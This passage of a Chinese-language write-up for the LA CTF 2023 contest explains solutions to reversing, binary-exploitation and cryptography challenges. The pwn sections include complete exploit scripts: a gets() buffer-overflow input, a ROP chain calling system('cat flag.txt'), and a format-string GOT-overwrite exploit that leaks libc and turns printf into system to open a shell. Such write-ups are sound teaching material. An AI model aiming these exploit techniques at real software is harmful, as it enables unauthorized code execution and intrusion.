  puts("Very Doable Pwn - 500 points, 0 solves");
  puts("Can you help me pwn this program?");
  puts("#include <stdio.h>\nint main(void) {\n    puts(\"Bye!\");\n    return 0;\n}\n");
  puts("Enter the flag:");
  fgets(local_108,0x100,stdin);
  sVar2 = strcspn(local_108,"\n");
  lVar3 = 0;
  puVar4 = &DAT_00104060;
  local_108[sVar2] = '\0';
  do {
    cVar1 = FUN_00101230(puVar4[lVar3]);
    if (cVar1 != local_108[lVar3]) {
      puts("Incorrect flag.");
      return 0;
    }
    lVar3 = lVar3 + 1;
  } while (lVar3 != 0x2f);
  puts("You got the flag! Unfortunately we don\'t exactly have a database to store the solve in..." )
  ;
  return 0;
}
```
:::

可以看到，會先讀入輸入後，對內部儲存的一個奇怪字元陣列每個字元進行轉換，並比對轉換後結果是否與輸入相同

以下是轉換部分

:::spoiler
```clike
int FUN_00101230(uint param_1)

{
  byte bVar1;
  uint uVar2;
  int iVar3;
  
  uVar2 = 0;
  iVar3 = 0;
  do {
    bVar1 = (byte)iVar3 & 0x1f;
    iVar3 = iVar3 + 1;
    param_1 = (param_1 * param_1 >> bVar1 | param_1 * param_1 << 0x20 - bVar1) * 0x1337 + 0x420133 7
              ^ uVar2;
    uVar2 = uVar2 + 0x13371337;
  } while (iVar3 != 0x20);
  return (param_1 >> 8) + (param_1 >> 0x10) + param_1 + (param_1 >> 0x18);
}
```
:::

看起來是個簡單的轉換?

原本我預期把轉換邏輯弄到 python 上並直接轉換內部的神祕字串，但一直弄不出來，推測是跟型態之類的問題有關

但總之我換了一個辦法，使用 gdb 執行並動態分析，取出每次轉換後的資料，以下是我 leak 出來的結果

```!
6c 61 63 74 66 7b 6d 34 79 62 33 5f 74 68 33 72 33 5f 31 73 5f 73 30 6d 33 5f 6d 33 72 31 74 5f 74 30 5f 75 73 31 6e 67 5f 34 5f 64 62 7d
```

轉成 ascii 即可拿 flag

這題我推測應該也可以用 time based side channel 的方式來 leak

`lactf{m4yb3_th3r3_1s_s0m3_m3r1t_t0_us1ng_4_db}`

## Pwn
### gatekeep
```
If I gaslight you enough, you won't be able to get my flag! :)

`nc lac.tf 31121`

Note: The attached binary is the exact same as the one executing on the remote server.
```
附件: `Dockerfile`, `gatekeep.c`, `gatekeep`

以下是 gatekeep.c 的部分內容
:::spoiler gatekeep.c
```clike=
int check(){
    char input[15];
    char pass[10];
    int access = 0;

    // If my password is random, I can gatekeep my flag! :)
    int data = open("/dev/urandom", O_RDONLY);
    if (data < 0)
    {
        printf("Can't access /dev/urandom.\n");
        exit(1);
    }
    else
    {
        ssize_t result = read(data, pass, sizeof pass);
        if (result < 0)
        {
            printf("Data not received from /dev/urandom\n");
            exit(1);
        }
    }
    close(data);
    
    printf("Password:\n");
    gets(input);

    if(strcmp(input, pass)) {
        printf("I swore that was the right password ...\n");
    }
    else {
        access = 1;
    }

    if(access) {
        printf("Guess I couldn't gaslight you!\n");
        print_flag();
    }
}
```
:::

可以看到，裡面讀取密碼的部分使用 gets 進行讀取，很明顯的有 BOF 的漏洞

而觀察 assembly 後，可以看到進行檢查的 access 變數在 input 的後面，可以直接覆蓋過去

```
   0x00005555555552e5 <+145>:   lea    rax,[rbp-0x1f]
   0x00005555555552e9 <+149>:   mov    rdi,rax
=> 0x00005555555552ec <+152>:   call   0x5555555550a0 <gets@plt>
   0x00005555555552f1 <+157>:   lea    rdx,[rbp-0x29]
   0x00005555555552f5 <+161>:   lea    rax,[rbp-0x1f]
   0x00005555555552f9 <+165>:   mov    rsi,rdx
   0x00005555555552fc <+168>:   mov    rdi,rax
   0x00005555555552ff <+171>:   call   0x555555555090 <strcmp@plt>
   0x0000555555555304 <+176>:   test   eax,eax
   0x0000555555555306 <+178>:   je     0x555555555316 <check+194>
   0x0000555555555308 <+180>:   lea    rdi,[rip+0xd79]        # 0x555555556088
   0x000055555555530f <+187>:   call   0x555555555030 <puts@plt>
   0x0000555555555314 <+192>:   jmp    0x55555555531d <check+201>
   0x0000555555555316 <+194>:   mov    DWORD PTR [rbp-0x4],0x1
   0x000055555555531d <+201>:   cmp    DWORD PTR [rbp-0x4],0x0
   0x0000555555555321 <+205>:   je     0x555555555339 <check+229>
   0x0000555555555323 <+207>:   lea    rdi,[rip+0xd86]        # 0x5555555560b0
   0x000055555555532a <+214>:   call   0x555555555030 <puts@plt>
   0x000055555555532f <+219>:   mov    eax,0x0
   0x0000555555555334 <+224>:   call   0x5555555551d5 <print_flag>
```

input 在 `rbp-0x1f`，而 access 在 `rbp-0x4`，因此只要覆蓋 27 個字元之後即可碰觸到 access 的變數內容 (內容不一定要填 1，因為在 c 中整數只要不是 0 都可以當成 true)

```
$ nc lac.tf 31121
If I gaslight you enough, you won't be able to guess my password! :)
Password:
123456789012345678901234567a
I swore that was the right password ...
Guess I couldn't gaslight you!
lactf{sCr3am1nG_cRy1Ng_tHr0w1ng_uP}
```

`lactf{sCr3am1nG_cRy1Ng_tHr0w1ng_uP}`

### bot
```
I made a bot to automatically answer all of your questions.

`nc lac.tf 31180`
```
附件: `Dockerfile`, `bot`, `bot.c`, `libc-2.31.so`, `ld-2.31.so`

:::spoiler bot.c
```clike=
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(void) {
  setbuf(stdout, NULL);
  char input[64];
  volatile int give_flag = 0;
  puts("hi, how can i help?");
  gets(input);
  if (strcmp(input, "give me the flag") == 0) {
    puts("lol no");
  } else if (strcmp(input, "please give me the flag") == 0) {
    puts("no");
  } else if (strcmp(input, "help, i have no idea how to solve this") == 0) {
    puts("L");
  } else if (strcmp(input, "may i have the flag?") == 0) {
    puts("not with that attitude");
  } else if (strcmp(input, "please please please give me the flag") == 0) {
    puts("i'll consider it");
    sleep(15);
    if (give_flag) {
      puts("ok here's your flag");
      system("cat flag.txt");
    } else {
      puts("no");
    }
  } else {
    puts("sorry, i didn't understand your question");
    exit(1);
  }
}
```
:::

在原始碼中可以發現，在第 11 行的地方是使用 gets 讀取字串，有明顯的 BOF 漏洞

使用 checksec 檢測，發現 canary 和 PIE 是關的，可以方便我們進行攻擊

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

因此攻擊思路是先隨便進到一個 entry，並用 `\x00` 把 input 的 64 個字元填滿，並使用 ROP 串接 `pop rdi` 的 gadget 後呼叫 system

以下是攻擊腳本

:::spoiler solve.py
```python
from pwn import *
binary = "./bot"

context.terminal = ["cmd.exe", "/c", "start", "bash.exe", "-c"]
context.log_level = "debug"
context.binary = binary

conn = remote("lac.tf", 31180)
# conn = process(binary)
# conn = gdb.debug(binary)

system = p64(0x401050)
cat_flag = p64(0x4020f3)
pop_rdi = p64(0x40133b)
ret = p64(0x401016)

payload = b"give me the flag"
payload += b"\x00" * (64 - len(payload))
payload += b"A"*8
payload += ret
payload += pop_rdi
payload += cat_flag
payload += system
conn.sendlineafter(b"help?\n", payload)
conn.interactive()
```
:::

由於有 alignment 的問題，所以必須要多串一個 ret 的 gadget

`lactf{hey_stop_bullying_my_bot_thats_not_nice}`

### (X)rickroll
```
Make your own custom rickroll with my new rickroll program!

`nc lac.tf 31135`
```
附件: `Dockerfile`, `rickroll`, `rickroll.c`

:::spoiler rickroll.c
```clike=
#include <stdio.h>

int main_called = 0;

int main(void) {
    if (main_called) {
        puts("nice try");
        return 1;
    }
    main_called = 1;
    setbuf(stdout, NULL);
    printf("Lyrics: ");
    char buf[256];
    fgets(buf, 256, stdin);
    printf("Never gonna give you up, never gonna let you down\nNever gonna run around and ");
    printf(buf);
    printf("Never gonna make you cry, never gonna say goodbye\nNever gonna tell a lie and hurt you\n");
    return 0;
}
```
:::

從程式中可以看到，輸入長度有做限制，所以應該是沒有 BOF 漏洞，但在第 16 行可以看到有個很明顯的 format string 漏洞

以下是 checksec 檢查
```
[*] '/home/ywc/myworkspace/lactf/rickroll/rickroll'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
```

可以看到 RELRO 是 partial relro，所以可以嘗試做 GOT hijacking，不過由於程式中沒有如 system 之類的危險函式，所以需要 leak libc 來取得可利用的函式

所以需要做的有以下這幾點:

1. 讓 main 循環執行
2. leak libc
3. 修改其中某個函式的 GOT 成 system，並且是在我們可控制的部分

延伸以上需求，因此還額外需要這幾點:

4. 為了要讓 main 檢查通過，需要修改 main_called 回 0
5. 題目沒給 libc，需要去 docker 拿

首先先來完成第 5 點，以下參考[這部 wu 影片](https://youtu.be/K5sTGQPs04M?t=197)

首先我們有 Dockerfile，內容如下

:::spoiler Dockerfile
```dockerfile
FROM pwn.red/jail

COPY --from=debian@sha256:98d3b4b0cee264301eb1354e0b549323af2d0633e1c43375d0b25c01826b6790 / /srv
COPY rickroll /srv/app/run
COPY flag.txt /srv/app/flag.txt
RUN chmod 755 /srv/app/run
```
:::

可以看到其中有一個 copy from 的 hash，我們嘗試 volumn 並從裡面複製 libc 出來，方便進行後續分析

首先先產生 container，並進行 volumn 及啟動 terminal

```bash
docker run -it -v "$(pwd):/chal" debian@sha256:98d3b4b0cee264301eb1354e0b549323af2d0633e1c43375d0b25c01826b6790
```

進入 container 後，進入 `/chal` 目錄，查看 `rickroll` 的 link target

```bash=
cd /chal
ldd ./rickroll
```
```
linux-vdso.so.1 (0x00007ffe71b2b000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f5181b2e000)
/lib64/ld-linux-x86-64.so.2 (0x00007f5181d07000)
```

可以看到，連結位置是在 `/lib/x86_64-linux-gnu/libc.so.6` 之下，但可預期的是這也是一個 link

```bash
ls -al /lib/x86_64-linux-gnu/libc.so.6
```
```
lrwxrwxrwx 1 root root 12 Oct 14 19:35 /lib/x86_64-linux-gnu/libc.so.6 -> libc-2.31.so
```

看到真實的 libc 了，複製到我們 volumn 的資料夾中，成功取出 libc

```bash
cp /lib/x86_64-linux-gnu/libc-2.31.so .
```

有了 libc 之後，回到前面的需求 1~4

以下參考[這篇官方 wu](https://github.com/uclaacm/lactf-archive/blob/main/2023/pwn/rickroll/solve.py) 和[這篇 wu](https://github.com/qhdwight/ctf-writeups/blob/master/la-ctf-2023/rickroll/rickroll.py)

首先來看需求 1，需要想辦法修改回 main，我們可以做的方式有以下兩種

1. 修改 return address 成 main
2. 修改某個函式的 GOT

第一種方式雖然很簡單易懂，但是不可行，假如我們要用第一個方式的話會將 payload 寫成 `f"%{0x401152}c%XX$n"`，`0x401152` 是 main 的位置，而 `%XX$n` 是因為是假設我們在參數 XX 位置寫下放 return address 的記憶體的位置，這樣子的問題在我們並不知道該位置，除非我們有辦法在前面某個地方就先 leak 出來

而第二種方式看起來不太可行，因為從原始碼來看 16 行後面也還是 printf 阿幹，改掉了之後後面只要遇到 printf 就會跳回 main ㄟ，也就沒辦法再次利用了

不過這個是題目的陷阱，因為從 assembly 來看，最後的 printf 其實是 puts (puts: 哈哈是我啦)，所以我們可以透過改 puts 的 GOT 成 main，即可解決需求一

![](https://i.imgur.com/J3g72Zu.png)

![](https://i.imgur.com/CJvRDC8.png =200x)

不過我們不可能直接寫成像是前面舉例的 `f"%{0x401152}c%XX$n"` 這樣格式，因為 printf 印出是需要花時間的，尤其是印這麼大的數一定會花上爆幹久的時間

這個部份我們有一個特殊的利用方法，也就是分開每個 bytes 來填數值，舉例來說像是我們要填的 puts.got 位置為 0x404018，而我們需要填入 main 的位置 0x401152，那我們可以產生 0x404018, 0x404019, ... 到 0x404025 這 8 個位置，並分別填入 0x18, 0x40, 0x40, 0x00, ... 等數值，這樣一來就只會印出 0x18+0x40+0x40+0x0... 的字元數而已，印起來不太花時間，完美

![](https://i.imgur.com/kbcWbIe.png =300x)

而不過要注意的是印出字元數是會持續累計的，所以不會直接是 `f"%{0x18}c%XX$hhn%{0x40}c%XX$hhn%{0x40}c%XX$hhn"` 這樣，一般來說這邊有兩種放法

1. 位置順序排程: 假如要寫 0x401230 給 0x404040，則會寫成 `f"%{0x12}c%10$hhn%{0x30-0x12}c%11$hhn%{0x40-0x30}c%12$hhn{p64(0x404041)}{p64(0x404042)}{p64(0x404040)}"`，注意後面存入順序是依照寫入字元數大小來排序
2. 字元數 overflow: 同前面例子，會寫成 `f"%{0x40}c%10$hhn%{(0x12-0x40)&0xff}c%11$hhn%{(0x30-(0x12-0x40)&0xff)&0xff}c%12$hhn{p64(0x404040)}{p64(0x404041)}{p64(0x404042)}"`，後面存入順序是照順序而字元數會因為加法 overflow 而存入最低幾位

以下我們會使用放法 2

另外順便講一下需求 4 好了，反正就是在最前面直接放 `%XX$n` 然後存入順序把 `main_called` 放第一個即可  (畢竟是填 0)，字元數不會動因為 `%XX$n` 不會印出任何字元

然後需求 2 的部分直接用 `%39$p` 來 leak return address 即可，因為 main 的 return address 會到 libc 裡頭所以就可以據此計算偏移量，數字 39 是因為參數的第 $6 + \frac{256}{8} + 1 = 39$ 而來，另外要注意的就是印的部分放字元數 payload 後面 address 中間，因為放字元數 payload 前會影響字元數的計算，而放 address 之後會因為 address 有 `\x00` 的原因而印不出來

總之說了一大段，這部分 payload 如下
:::spoiler
```python
main_called = elf.symbols["main_called"] # 0x40406c
main = elf.symbols["main"] # 0x401152
puts_got = elf.got["puts"] # 0x404018

writecommand_length = 0x70
writeaddr_begin = 0x80

## write command section
payload = f"%{6+writeaddr_begin//8}$n".encode()
num_temp = main
total = 0
for i in range(8):
    writenum = ((num_temp&0xff) - total) & 0xff
    if(writenum != 0):
        payload += f"%{writenum}c".encode()
    payload += f"%{6+writeaddr_begin//8+1+i}$hhn".encode()
    total += writenum
    num_temp //= 0x100
payload = payload.ljust(writecommand_length, b".")
## leak libc section
payload += f"[%{6+256//8+1}$p]".encode()
payload = payload.ljust(writeaddr_begin, b".")
## writeaddr section
payload += p64(main_called)
for i in range(8):
    payload += p64(puts_got+i)
conn.sendlineafter(b"Lyrics: ", payload)

conn.recvuntil(b"[")
leaked = conn.recvuntil(b"]", drop=True).strip()

print(f"{leaked =}")
```
:::

接下來剩下需求 3 了，需要找一個函式的 GOT 並填入 libc 中的 system 函式

首先先來計算 system 函數，由於我們 leak 出的 return address 在下圖中的位置，因此 system 的位置是在 `leaked - 0x23d0a + elf.libc.sybmols["system"]` 的地方

![](https://i.imgur.com/trTUkLd.png =400x)

接下來勝的問題就是找 GOT 了，可以看到我們並沒有太多選擇，就只有 setbuf, printf, fgets 或 puts 可選，與我們輸入相關的就只有 fgets 和 printf 可選，這邊我只能想到 printf 的解法啦看看另一個有沒有其他大神能夠利用

可以看到改 printf 後雖然有一些奇怪的字串會送進去 system 執行，但是經實驗證實執行這些怪怪字串是不會有任何問題的，可以放心改 printf

總而言之全部的 payload 如下

:::spoiler solve.py
```python
from pwn import *
binary = "./rickroll"

context.terminal = ["cmd.exe", "/c", "start", "bash.exe", "-c"]
context.log_level = "debug"
context.binary = binary

elf = ELF(binary)

conn = remote("lac.tf", 31135)
# conn = process(binary)
# conn = gdb.debug(binary)

# puts -> main
# main_called -> 0
# also leak the libc
main_called = elf.symbols["main_called"] # 0x40406c
main = elf.symbols["main"] # 0x401152
puts_got = elf.got["puts"] # 0x404018

writecommand_length = 0x70
writeaddr_begin = 0x80

## write command section
payload = f"%{6+writeaddr_begin//8}$n".encode()
num_temp = main
total = 0
for i in range(8):
    writenum = ((num_temp&0xff) - total) & 0xff
    if(writenum != 0):
        payload += f"%{writenum}c".encode()
    payload += f"%{6+writeaddr_begin//8+1+i}$hhn".encode()
    total += writenum
    num_temp //= 0x100
payload = payload.ljust(writecommand_length, b".")
## leak libc section
payload += f"[%{6+256//8+1}$p]".encode()
payload = payload.ljust(writeaddr_begin, b".")
## writeaddr section
payload += p64(main_called)
for i in range(8):
    payload += p64(puts_got+i)
conn.sendlineafter(b"Lyrics: ", payload)

conn.recvuntil(b"[")
leaked = conn.recvuntil(b"]", drop=True).strip()

print(f"{leaked =}")

# printf -> system
system = int(leaked[2:], base=16) - 0x23d0a + elf.libc.symbols["system"]
printf_got = elf.got["printf"] # 0x404028

writecommand_length = 0x70
writeaddr_begin = 0x70

## write command section
payload = f"%{6+writeaddr_begin//8}$n".encode()
num_temp = system
total = 0
for i in range(8):
    writenum = ((num_temp&0xff) - total) & 0xff
    if(writenum != 0):
        payload += f"%{writenum}c".encode()
    payload += f"%{6+writeaddr_begin//8+1+i}$hhn".encode()
    total += writenum
    num_temp //= 0x100
payload = payload.ljust(writecommand_length, b".")
## writeaddr section
payload += p64(main_called)
for i in range(8):
    payload += p64(printf_got+i)
conn.sendlineafter(b"Lyrics: ", payload)

# pwned
conn.sendline(b"/bin/sh")
conn.interactive()
```
:::

幹這題講解真他媽有夠長

由於比賽已結束，無法確認 flag 正確性，以下 flag 僅供參考

`lactf{printf_gave_me_up_and_let_me_down}`

## Crypto
### one-more-time-pad
```python=
from itertools import cycle
pt = b"Long ago, the four nations lived together in harmony ..."

key = cycle(b"lactf{??????????????}")

ct = ""

for i in range(len(pt)):
    b = (pt[i] ^ next(key))
    ct += f'{b:02x}'
print("ct =", ct)

#ct = 200e0d13461a055b4e592b0054543902462d1000042b045f1c407f18581b56194c150c13030f0a5110593606111c3e1f5e305e174571431e
```

cycle 會循環生成
所以就是 ct 直接 $\oplus$ pt 就好

> flag : `lactf{b4by_h1t_m3_0ne_m0r3_t1m3}`

### chinese-lazy-theorem

直接看重點
```py=
    if response == "1":
        if used_oracle:
            print("too lazy")
            print()
        else:
            modulus = input("Type your modulus here: ")
            modulus = int(modulus)
            if modulus <= 0:
                print("something positive pls")
                print()
            else:
                used_oracle = True
                print(target%modulus)
                print()
```

他沒限制 input 大小
所以直接輸入 2 >> 1200 給他 mod

![](https://i.imgur.com/YrjMSkM.png)
超水

> flag : `lactf{too_lazy_to_bound_the_modulus}`

### greek cipher
```!
You think you've seen all of the "classic" ciphers? Instead of your standard cipher, I've created my own cipher: the monoalphagreek cipher!

Answer with just the flag in lowercase with symbols left in.
```
附件: `greek.txt`

:::spoiler greek.txt
```!
κςκ ωπν αζπλ ιησι χνοςνθ μσγθσρ λσθ ζπι ιηγ δςρθι ψγρθπζ ςζ ηςθιπρω θνθψγμιγκ πδ νθςζε γζμρωψιςπζ? τγ ζγςιηγρ. κςκ ωπν αζπλ ιησι χνοςνθ μσγθσρ λσθ ψρπξσξοω δονγζι ςζ εργγα? τγ ζγςιηγρ. ς οςαγ ηπλ εργγα μησρσμιγρ οππα ιηπνεη, γυγζ ςδ ς μσζ'ι ργσκ ιηγτ. οσμιδ{ς_ενγθθ_νθςζε_τσζω_εργγα_μησρσμιγρθ_κςκζ'ι_θιπψ_ωπν._λγοο_ψοσωγκ_ς_τνθι_θσω.μπζερσιθ!}
```
:::

從題目敘述可知道這是一個 mono substitute 的變換加密，而從已知明文以及猜測的方式慢慢推可推回原始句子

以下是變換表

:::spoiler substitute
```
ο -> l
σ -> a
μ -> c
ι -> t
δ -> f
ζ -> n
η -> h
ρ -> r
γ -> e
κ -> d
ω -> y
θ -> s
ε -> g
ν -> u
ς -> i
α -> k
π -> o
λ -> w
ψ -> p
χ -> j
ξ -> b
τ -> m
```
:::

原文:
```!
did you know that julius caesar was not the first person in history suspected of using encryption? me neither. did you know that julius caesar was probably fluent in greek? me neither. i like how greek character look though, eυen if i can't read them. lactf{i_guess_using_many_greek_characters_didn't_stop_you._well_played_i_must_say.congrats!}
```

`lactf{i_guess_using_many_greek_characters_didn't_stop_you._well_played_i_must_say.congrats!}`

### (X)chinese-lazy-theorem-2
```
Ok I'm a little less lazy now but you're still not getting much from me.

`nc lac.tf 31111`
```
附件: `chinese-lazy-theorem-2.py`

:::spoiler chinese-lazy-theorem-2.py
```python
#!/usr/local/bin/python3

from Crypto.Util.number import getPrime
from Crypto.Random.random import randint

p = getPrime(512)
q = getPrime(512)
n = p*q*2*3*5

target = randint(1, n)

oracle_uses = 0

print(p)
print(q)

print("This time I'll answer 2 modulus questions and give you 30 guesses.")
while True:
    print("What do you want?")
    print("1: Ask for a modulus")
    print("2: Guess my number")
    print("3: Exit")
    response = input(">> ")

    if response == "1":
        if oracle_uses == 2:
            print("too lazy")
            print()
        else:
            modulus = input("Type your modulus here: ")
            modulus = int(modulus)
            if modulus <= 0:
                print("something positive pls")
                print()
            elif modulus > max(p, q):
                print("something smaller pls")
                print()
            else:
                oracle_uses += 1
                print(target%modulus)
                print()
    elif response == "2":
        for _ in range(30):
            guess = input("Type your guess here: ")
            if int(guess) == target:
                with open("flag.txt", "r") as f:
                    print(f.readline())
                    exit()
            else:
                print("nope")
        exit()
    else:
        print("bye")
        exit()
```
:::

可以看到，題目要求我們猜數字，並給了我們 module 的提示，但限定最大只能填到 max(p,q) 的數字進行 module，無法像前題目那樣直接給超大的數字拿出答案

不過由於給的 oracle 次數為 2，可以嘗試使用 CRT 方法嘗試求出原數

:::spoiler solve.py
```python=
from pwn import *
from sage.all import CRT
from Crypto.Util.number import getPrime

context.log_level = "debug"

def getMoudles(x: int) -> int:
    conn.sendlineafter(b">> ", b"1")
    conn.sendlineafter(b"here: ", str(x).encode())
    ret = conn.recvline().strip()
    if(b"pls" in ret):
        return -1
    return int(ret)

conn = remote("lac.tf", 31111)
# conn = process(["python", "chinese-lazy-theorem-2.py"])
p1 = int(conn.recvline().strip())
p2 = int(conn.recvline().strip())
m1 = getMoudles(p1)
m2 = getMoudles(p2)

crt_base = CRT([m1,m2], [p1,p2])
adder = p1*p2
guess = crt_base
conn.sendlineafter(b">> ", b"2")
while(True):
    conn.sendlineafter(b"here: ", str(guess).encode())
    ret = conn.recvline().strip()
    if(b"nope" not in ret):
        print(ret)
        break
    guess += adder
```
:::

在第 32 行的 += 是因為 CRT 求出的數不唯一，只會求出最小正整數解，而此數加上 $p_1 \times p_2$ 亦也會是合理的解，因此這邊會需要做爆破找出正確的解

這題我一開始沒注意到有給 p 和 q，所以原本我是直接嘗試隨機取質數來計算，無法猜出數字，後來有 p 和 q 就成功了

由於比賽已結束，無法確認 flag 正確性，以下 flag 僅供參考

`lactf{n0t_$o_l@a@AzY_aNYm0Re}`

### (X)ravin-cryptosystem
```
I don't really understand why people choose big numbers that can't be factored. No one has been able to crack my RSA implementation even though my modulus is factorable. It should just be normal RSA??? All I did was make it faster. I've asked my friends and the only feedback I've gotten so far are rave reviews about how secure my algorithm is. Hmm, maybe I'll name it the Ravin Cryptosystem. There better not be anyone with a similar idea.
```
附件: `output.txt`, `ravin.py`

:::spoiler ravin.py
```python
from Crypto.Util import number

def fastpow(b, p, mod):
    # idk this is like repeated squaring or something i heard it makes pow faster
    a = 1
    while p:
        p >>= 1
        b = (b*b)%mod
        if p&1:
            a = (a*b)%mod
    return a

p = number.getPrime(100)
q = number.getPrime(100)
n = p*q
e = 65537
m = int.from_bytes(open("flag.txt", "r").readline().strip().encode(), 'big')
assert(m < n)
c = fastpow(m, e, n)

print("n =", n)
print("e =", e)
print("c =", c)
```
:::

:::spoiler output.txt
```
n = 996905207436360486995498787817606430974884117659908727125853
e = 65537
c = 375444934674551374382922129125976726571564022585495344128269
```
:::

可以看到，題目中的 p 和 q 皆非常小，可以嘗試使用 factordb 來找看看質因數分解

結果如[連結](http://factordb.com/index.php?query=996905207436360486995498787817606430974884117659908727125853)，可以發現 n 能分解成 `861346721469213227608792923571` 和 `1157379696919172022755244871343` 這兩個數字的乘積

不過這題的問題在於 fastpow 函數寫錯，因此實際上不是 65537 的次方而是 65536，也就導致了因 GCD(e,phi) != 1，因此無法直接求出 d 算出解密

不過我們可以利用以下思路來求出原來的訊息 m

1. 求出在 mod p 和 mod q 下的 c: $c_p$, $c_q$
2. 由於 65536 = 2^16，因此對 $c_p$, $c_q$ 分別進行 16 層的 Quadratic-Residue 求解，也就是算出所有可能的 $m_p$, $m_q$
3. 對所有結果進行 CRT，求出 $m\ (mod\ p*q) = m\ (mod\ n)$，並進行篩選求出正確的訊息

以下是計算的腳本

:::spoiler solve.py
```python
from Crypto.Util.number import GCD, long_to_bytes
from sage.all import CRT

def QR(y2:int, p:int) -> int:
    assert pow(y2, (p-1)//2, p) == 1, "Not quadratic residues"
    assert p%2 == 1, 'p is not prime'
    if(p%4 == 3):
        y = pow(y2, (p+1)//4, p)
        return y
    raise NotImplementedError

def recrusion(num, prime, deep = 0, is_p = True):
    global possible_mp
    global possible_mq
    if(deep == 16):
        if(is_p):
            possible_mp.append(num)
        else:
            possible_mq.append(num)
        return
    try:
        n = QR(num, prime)
    except AssertionError:
        return
    recrusion(n, prime, deep+1, is_p)
    recrusion(-n%p, prime, deep+1, is_p)


n = 996905207436360486995498787817606430974884117659908727125853
e = 65537 - 1
c = 375444934674551374382922129125976726571564022585495344128269

# factordb
p = 861346721469213227608792923571
q = 1157379696919172022755244871343

assert p*q == n

possible_mp = []
possible_mq = []
recrusion(c%p, p, is_p = True)
recrusion(c%q, q, is_p = False)

for mp in possible_mp:
    for mq in possible_mq:
        m = long_to_bytes(CRT([mp,mq], [p,q]))
        if(b"lactf" in m):
            print(m)
```
:::

由於這題的 p 和 q 皆 $\equiv 3\ (mod\ 4)$，因此可以用快速的方式求出 QR 求解，如果不是的話就要動用 Tonelli–Shanks 了

由於比賽已結束，無法確認 flag 正確性，以下 flag 僅供參考

`lactf{g@rbl3d_r6v1ng5}`